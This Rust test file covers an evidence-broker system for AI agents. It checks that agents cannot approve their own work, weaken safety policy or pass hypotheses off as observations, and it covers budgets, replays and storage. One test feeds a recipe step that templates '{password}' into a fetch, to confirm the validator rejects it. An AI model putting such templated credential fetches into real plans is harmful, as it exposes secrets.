        .find(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog)
        .unwrap()
        .evidence_id
        .clone();
    let observed = Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: "refunds".into(),
            version: Some("v3".into()),
        },
        episode_id: result.pack.episode_id.clone(),
        contribution_type: ContributionType::Observation,
        namespace: Namespace::Observed,
        content: json!({"observation": "the worker crashes"}),
        evidence_refs: vec![log.clone()],
        locality: Locality::Reusable,
        valid_until: None,
    };
    assert_eq!(
        broker
            .store
            .propose(&agent, observed.clone(), 1)
            .unwrap_err()
            .code,
        ErrorCode::Unauthorized
    );
    let approved = Proposal {
        namespace: Namespace::HumanApproved,
        ..observed.clone()
    };
    assert_eq!(
        broker.store.propose(&agent, approved, 1).unwrap_err().code,
        ErrorCode::Unauthorized
    );
    let unsupported = Proposal {
        namespace: Namespace::AgentProposed,
        evidence_refs: vec!["evd_missing".into()],
        ..observed.clone()
    };
    assert_eq!(
        broker
            .store
            .propose(&agent, unsupported, 1)
            .unwrap_err()
            .code,
        ErrorCode::EvidenceRequired
    );
    let id = broker
        .store
        .propose(
            &agent,
            Proposal {
                namespace: Namespace::AgentProposed,
                ..observed
            },
            1,
        )
        .unwrap();
    assert_eq!(
        broker.store.contributions.contributions[&id].status,
        ContributionStatus::Proposed
    );
    let guess = hypothesis(
        &agent,
        Claim {
            subject: entity_id(EntityKind::Deployment, "dep-7731"),
            subject_kind: EntityKind::Deployment,
            subject_key: "dep-7731".into(),
            predicate: "root_cause".into(),
            object: json!("missing column"),
        },
        "the column is missing",
        vec![log],
        None,
        3,
    );
    assert_eq!(
        (guess.status, guess.derivation.method),
        (AssertionStatus::Proposed, DerivationMethod::AgentHypothesis)
    );
}

/** 17. Self-approval, approval by agents, and policy weakening are refused; accepted constraints
 * still require Crane's workflow and hypotheses never become observations
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn refuses_self_approval_and_policy_weakening() {
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
    let scenario = demo::scenario().unwrap();
    let reviewer = demo::engineer(&scenario);
    let author = AccessPolicy {
        actor: Actor::new("dev@acme.example", ActorKind::Human),
        ..reviewer.clone()
    };
    let deployment = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::Deployment)
        .unwrap()
        .evidence_id
        .clone();
    let proposal = |kind: ContributionType, namespace: Namespace, content: Value| Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: "refunds".into(),
            version: Some("v3".into()),
        },
        episode_id: None,
        contribution_type: kind,
        namespace,
        content,
        evidence_refs: vec![deployment.clone()],
        locality: Locality::Reusable,
        valid_until: Some(10_000),
    };
    let observation = broker
        .store
        .propose(
            &author.actor,
            proposal(
                ContributionType::Observation,
                Namespace::Observed,
                json!({"observation": "deploys of this zone need a backfill"}),
            ),
            1,
        )
        .unwrap();
    assert_eq!(
        broker
            .store
            .review(
                &author,
                &observation,
                ContributionStatus::Accepted,
                "mine",
                2
            )
            .unwrap_err()
            .code,
        ErrorCode::SelfApproval
    );
    let agent = AccessPolicy {
        actor: Actor::new("agent-1", ActorKind::Agent),
        may_review: true,
        ..reviewer.clone()
    };
    assert_eq!(
        broker
            .store
            .review(
                &agent,
                &observation,
                ContributionStatus::Accepted,
                "lgtm",
                2
            )
            .unwrap_err()
            .code,
        ErrorCode::Unauthorized
    );
    let agent_actor = agent.actor.clone();
    let weaken = proposal(
        ContributionType::ConstraintProposal,
        Namespace::AgentProposed,
        json!({"effect": "relax", "policy": "refund_safety"}),
    );
    assert_eq!(
        broker
            .store
            .propose(&agent_actor, weaken, 3)
            .unwrap_err()
            .code,
        ErrorCode::PolicyChange
    );
    let tighten = broker.store.propose(&agent_actor, proposal(ContributionType::ConstraintProposal, Namespace::AgentProposed, json!({"effect": "tighten", "policy": "refund_safety", "rule": "require a backfill check"})), 3).unwrap();
    broker
        .store
        .review(
            &reviewer,
            &tighten,
            ContributionStatus::Accepted,
            "agreed",
            4,
        )
        .unwrap();
    let accepted = &broker.store.contributions.contributions[&tighten];
    assert!(accepted.requires_crane_workflow);
    assert_eq!(
        (accepted.status, accepted.namespace),
        (ContributionStatus::Accepted, Namespace::HumanApproved)
    );
    let guess = broker
        .store
        .propose(
            &agent_actor,
            proposal(
                ContributionType::Hypothesis,
                Namespace::AgentProposed,
                json!({"hypothesis": "old jobs lack keys"}),
            ),
            5,
        )
        .unwrap();
    broker
        .store
        .review(
            &reviewer,
            &guess,
            ContributionStatus::Accepted,
            "plausible",
            6,
        )
        .unwrap();
    let reviewed = &broker.store.contributions.contributions[&guess];
    assert_eq!(
        (reviewed.contribution_type, reviewed.namespace),
        (ContributionType::Hypothesis, Namespace::HumanApproved)
    );
    assert_eq!(
        broker
            .store
            .review(&reviewer, &guess, ContributionStatus::Rejected, "again", 7)
            .unwrap_err()
            .code,
        ErrorCode::InvalidTransition
    );
    assert!(!transition_allowed(
        ContributionStatus::Rejected,
        ContributionStatus::Accepted
    ));
    let newer = broker
        .store
        .propose(
            &author.actor,
            proposal(
                ContributionType::Observation,
                Namespace::Observed,
                json!({"observation": "a newer note"}),
            ),
            8,
        )
        .unwrap();
    broker
        .store
        .contributions
        .supersede(&author, &observation, &newer)
        .unwrap();
    assert_eq!(
        broker.store.contributions.contributions[&observation].status,
        ContributionStatus::Superseded
    );
    assert_eq!(broker.store.contributions.expire(20_000), 3);
}

/** 18. The Evidence Pack is bounded, has a complete manifest, and warns about missing evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn builds_bounded_packs_with_manifests() {
    let (_, result) = investigate(&demo::scenario().unwrap());
    let pack = &result.pack;
    assert_eq!(pack.status, InvestigationStatus::Incomplete);
    let expected = pack.evidence.len() * 2
        + pack.entities.len()
        + pack.context_view.relations.len()
        + pack.assertions.len()
        + pack.contributions.task_local.len()
        + pack.contributions.reusable.len();
    assert_eq!(pack.manifest.entries.len(), expected);
    assert!(!pack.manifest.digest.is_empty() && pack.pack_id.starts_with("pck_"));
    assert!(pack.size_bytes <= pack.limits.max_bytes);
    let completeness = pack
        .warnings
        .iter()
        .filter(|warning| warning.kind == WarningKind::Completeness)
        .count();
    assert!(completeness >= 2, "test report and metrics are missing");
    let states = pack
        .sources
        .iter()
        .map(|source| source.state)
        .collect::<BTreeSet<_>>();
    for state in [
        SourceState::Collected,
        SourceState::Empty,
        SourceState::Unavailable,
        SourceState::NotQueried,
    ] {
        assert!(states.contains(&state), "{state:?} is reported");
    }
    let scenario = demo::scenario().unwrap();
    let mut small = demo::request(&scenario);
    small.pack_limits.max_records = 3;
    small.pack_limits.max_excerpt_chars = 40;
    let mut broker = broker(&scenario);
    let bounded = broker
        .investigate(small, &demo::engineer(&scenario))
        .unwrap()
        .pack;
    assert_eq!(bounded.evidence.len(), 3);
    assert!(bounded
        .evidence
        .iter()
        .all(|evidence| evidence.excerpt.to_string().len() < 200));
    let mut tiny = demo::request(&scenario);
    tiny.pack_limits.max_bytes = 30_000;
    let truncated = broker
        .investigate(tiny, &demo::engineer(&scenario))
        .unwrap()
        .pack;
    assert!(truncated
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Truncation));
}

/** 19. Task-local context stays separate from reusable zone and flow context, and inclusion in a
 * pack publishes nothing
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn separates_task_local_and_reusable_context() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, first) = investigate(&scenario);
    let episode = first.pack.episode_id.clone().unwrap();
    let agent = Actor::new("agent-1", ActorKind::Agent);
    let base = Proposal {
        target_ref: TargetRef {
            kind: TargetKind::WorkEpisode,
            id: episode.clone(),
            version: None,
        },
        episode_id: Some(episode.clone()),
        contribution_type: ContributionType::Summary,
        namespace: Namespace::AgentProposed,
        content: json!({"summary": "deployment failed on old jobs"}),
        evidence_refs: Vec::new(),
        locality: Locality::TaskLocal,
        valid_until: None,
    };
    broker.store.propose(&agent, base.clone(), 1).unwrap();
    assert!(broker
        .store
        .propose(
            &agent,
            Proposal {
                locality: Locality::Reusable,
                ..base.clone()
            },
            1
        )
        .is_err());
    let zone = Proposal {
        target_ref: TargetRef {
            kind: TargetKind::Zone,
            id: "refunds".into(),
            version: Some("v3".into()),
        },
        locality: Locality::Reusable,
        ..base
    };
    broker.store.propose(&agent, zone, 2).unwrap();
    let second = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let contributions = &second.pack.contributions;
    assert_eq!(contributions.task_local.len(), 1);
    assert_eq!(contributions.reusable.len(), 1);
    assert_eq!(contributions.reusable[0].target_ref.id, "refunds");
    assert!(contributions
        .task_local
        .iter()
        .chain(contributions.reusable.iter())
        .all(|contribution| contribution.status == ContributionStatus::Proposed));
    let zone_entity = second
        .pack
        .entities
        .iter()
        .find(|entity| entity.entity_id == entity_id(EntityKind::Zone, "refunds"))
        .unwrap();
    assert_eq!(zone_entity.version.as_deref(), Some("v3"));
}

/** 20. Query budgets are enforced and their exhaustion is explicit
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn enforces_query_budgets() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.budget = Budget {
        max_steps: 4,
        ..Budget::default()
    };
    let (_, result) = {
        let mut broker = broker(&scenario);
        let result = broker
            .investigate(request, &demo::engineer(&scenario))
            .unwrap();
        (broker, result)
    };
    assert_eq!(result.pack.status, InvestigationStatus::BudgetExhausted);
    assert_eq!(result.audit.stop_reason, StopReason::BudgetExhausted);
    assert_eq!(result.audit.usage.steps, 4);
    assert!(result
        .audit
        .steps
        .iter()
        .any(|step| step.state == StepState::BudgetExhausted));
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Budget));
    assert!(result.audit.metrics.budget_exhausted >= 1);
    let mut records = demo::request(&scenario);
    records.budget = Budget {
        max_records: 3,
        ..Budget::default()
    };
    let limited = broker(&scenario)
        .investigate(records, &demo::engineer(&scenario))
        .unwrap();
    assert_eq!(limited.audit.usage.records, 3);
    assert_eq!(limited.pack.status, InvestigationStatus::BudgetExhausted);
}

/** 21. A replay against unchanged sources is exact; after a source changes it is reported as
 * diverged, distinct from a fresh query, and the changed record supersedes the old one
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn distinguishes_replays_from_fresh_queries() {
    let mut scenario = demo::scenario().unwrap();
    let (mut broker, original) = investigate(&scenario);
    let policy = demo::engineer(&scenario);
    let same = broker.replay(&original.audit.query_id, &policy).unwrap();
    assert_eq!(
        same.audit.mode,
        ExecutionMode::Replay {
            of_query: original.audit.query_id.clone()
        }
    );
    assert_eq!(
        same.audit.replay.as_ref().unwrap().fidelity,
        ReplayFidelity::Exact
    );
    assert_eq!(same.pack.retrieval.mode, same.audit.mode);
    assert_eq!(original.audit.mode, ExecutionMode::Fresh);
    let deploy = resource(&mut scenario, "deploy");
    deploy.records[0].content["status"] = json!("rolled_back");
    deploy.records[0].source_revision = Some("dep-7731-v3".into());
    broker.connectors.insert(
        "deploy".into(),
        Box::new(FixtureConnector::new(deploy.records.clone())),
    );
    let changed = broker.replay(&original.audit.query_id, &policy).unwrap();
    let comparison = changed.audit.replay.clone().unwrap();
    assert_eq!(comparison.fidelity, ReplayFidelity::Diverged);
    assert!(comparison
        .differences
        .iter()
        .any(|difference| difference.starts_with("deployment@deploy")));
    let newest = changed
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::Deployment)
        .unwrap();
    assert!(broker.store.evidence[&newest.evidence_id]
        .supersedes
        .is_some());
    assert_eq!(
        broker.store.audit(&changed.audit.query_id).unwrap().replay,
        Some(comparison)
    );
    assert!(broker.replay("qry_unknown", &policy).is_err());
}

/** 22. Work Capture adds no dependency on the excluded product (named in the specification),
 * no new crate, and no new infrastructure
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn introduces_no_soil_or_new_infrastructure() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    let mut pending = vec![root.join("src")];
    let mut files = vec![root.join("Cargo.toml")];
    while let Some(directory) = pending.pop() {
        for entry in std::fs::read_dir(directory).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                pending.push(path);
            } else {
                files.push(path);
            }
        }
    }
    let excluded = ["so", "il"].concat();
    for file in &files {
        let text = std::fs::read_to_string(file)
            .unwrap_or_default()
            .to_ascii_lowercase();
        let words = text
            .split(|character: char| !character.is_ascii_alphanumeric() && character != '_')
            .collect::<BTreeSet<_>>();
        assert!(
            !words.contains(excluded.as_str()),
            "{} references the excluded product",
            file.display()
        );
        if file.starts_with(root.join("src").join("capture"))
            && file.file_name().is_some_and(|name| name != "tests.rs")
        {
            assert!(
                !text.contains("mongodb") && !text.contains("crate::server"),
                "{} reaches the hosted service",
                file.display()
            );
        }
    }
    let manifest = std::fs::read_to_string(root.join("Cargo.toml")).unwrap();
    let dependencies = manifest
        .split("[dependencies]")
        .nth(1)
        .unwrap()
        .split("\n[")
        .next()
        .unwrap();
    let names = dependencies
        .lines()
        .filter_map(|line| {
            line.split_once('=')
                .map(|(name, _)| name.trim().to_string())
        })
        .filter(|name| !name.starts_with('#'))
        .collect::<BTreeSet<_>>();
    let expected = [
        "serde",
        "serde_json",
        "serde_yaml",
        "sha2",
        "ed25519-dalek",
        "getrandom",
        "rpassword",
        "argon2",
        "chacha20poly1305",
        "ureq",
        "tiny_http",
        "mongodb",
    ]
    .iter()
    .map(|name| name.to_string())
    .collect::<BTreeSet<_>>();
    assert_eq!(names, expected);
}

/** The end-to-end demonstration: a bounded, incomplete pack with honest uncertainty, a proposed
 * hypothesis, an exact replay, feedback, and an outcome recorded with evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn runs_the_end_to_end_demonstration() {
    let report = demo::run().unwrap();
    assert_eq!(report.pack.status, InvestigationStatus::Incomplete);
    assert_eq!(report.pack.scope.zones[0].version.as_deref(), Some("v3"));
    assert_eq!(report.pack.scope.flows[0].version.as_deref(), Some("v2"));
    assert!(report
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Uncertainty));
    assert_eq!(
        report.replay.as_ref().unwrap().fidelity,
        ReplayFidelity::Exact
    );
    let episode = report.episode.unwrap();
    assert_eq!(episode.outcome, Some(EpisodeOutcome::Failed));
    assert_eq!(episode.feedback[0].sufficient, Truth::No);
    assert_eq!(
        serde_json::to_string(&demo::run().unwrap().pack).unwrap(),
        serde_json::to_string(&report.pack).unwrap(),
        "the demonstration is deterministic"
    );
    let mut untracked = WorkEpisode::open(None, "spike", 1);
    assert_eq!(
        untracked
            .record_outcome(
                &Actor::new("agent", ActorKind::Agent),
                EpisodeOutcome::Succeeded,
                Vec::new(),
                2
            )
            .unwrap_err()
            .code,
        ErrorCode::EvidenceRequired
    );
    let question = Question {
        question_id: "q1".into(),
        text: "Did tests run against old jobs?".into(),
        target: TargetRef {
            kind: TargetKind::WorkEpisode,
            id: episode.episode_id.clone(),
            version: None,
        },
        reason: "tests_passed is unknown".into(),
        relevant_evidence: Vec::new(),
        required_evidence: vec![EvidenceType::TestReport],
        permitted_resources: vec!["ci".into()],
        recipe: None,
        state: QuestionState::Open,
        asked_by: Actor::new("agent", ActorKind::Agent),
        answer_pack: None,
        created_at: 1,
    };
    let scenario = demo::scenario().unwrap();
    let mut routed = question
        .to_request(
            Some(&episode.episode_id),
            Some("PAY-142"),
            demo::request(&scenario).known,
            Budget::default(),
        )
        .unwrap();
    routed.plan = Some(vec![RecipeStep {
        step_id: "tests".into(),
        description: "test reports".into(),
        resource_type: crate::capture::resources::registry::ResourceType::Ci,
        operation: crate::capture::resources::registry::Operation::Query,
        evidence_type: EvidenceType::TestReport,
        record: None,
        filters: [("commit".to_string(), "{commit}".to_string())]
            .into_iter()
            .collect(),
        limit: 10,
        when: Predicate::Always,
    }]);
    let answer = broker(&scenario)
        .investigate(routed, &demo::engineer(&scenario))
        .unwrap();
    assert!(answer.audit.recipe.unwrap().recipe_id.starts_with("plan-"));
    assert!(answer.audit.steps.iter().all(|step| step
        .resource_id
        .as_deref()
        .is_none_or(|resource| resource == "ci" || resource == "landscape")));
    assert!(answer
        .pack
        .missing_evidence
        .iter()
        .any(|missing| missing.evidence_type == EvidenceType::TestReport));
    let mut bad_plan = demo::request(&scenario);
    bad_plan.plan = Some(vec![RecipeStep {
        record: Some("{password}".into()),
        operation: crate::capture::resources::registry::Operation::Fetch,
        ..failed_deployment().steps[0].clone()
    }]);
    assert_eq!(
        broker(&scenario)
            .investigate(bad_plan, &demo::engineer(&scenario))
            .unwrap_err()
            .code,
        ErrorCode::InvalidRecipe
    );
}

/** The store persists every collection and refuses a newer layout
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn persists_and_migrates_the_store() {
    let directory = tempfile::tempdir().unwrap();
    let scenario = demo::scenario().unwrap();
    let mut broker = demo::broker(&scenario, Clock::fixed(demo::DEMO_EPOCH)).unwrap();
    broker.store = CaptureStore::open(directory.path()).unwrap();
    let result = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    broker.store.save().unwrap();
    let reopened = CaptureStore::open(directory.path()).unwrap();
    assert_eq!(reopened.evidence.len(), broker.store.evidence.len());
    assert_eq!(
        reopened.graph.relations.len(),
        broker.store.graph.relations.len()
    );
    assert_eq!(reopened.packs[&result.pack.pack_id], result.pack);
    assert_eq!(
        reopened.audit(&result.audit.query_id).unwrap(),
        &result.audit
    );
    assert_eq!(
        reopened
            .evidence_of_type(EvidenceType::Deployment, 10)
            .len(),
        1
    );
    std::fs::write(
        directory.path().join("state.json"),
        r#"{"schema_version": 99, "deliveries": {}, "cursors": {}}"#,
    )
    .unwrap();
    assert_eq!(
        CaptureStore::open(directory.path()).unwrap_err().code,
        ErrorCode::SchemaVersion
    );
}
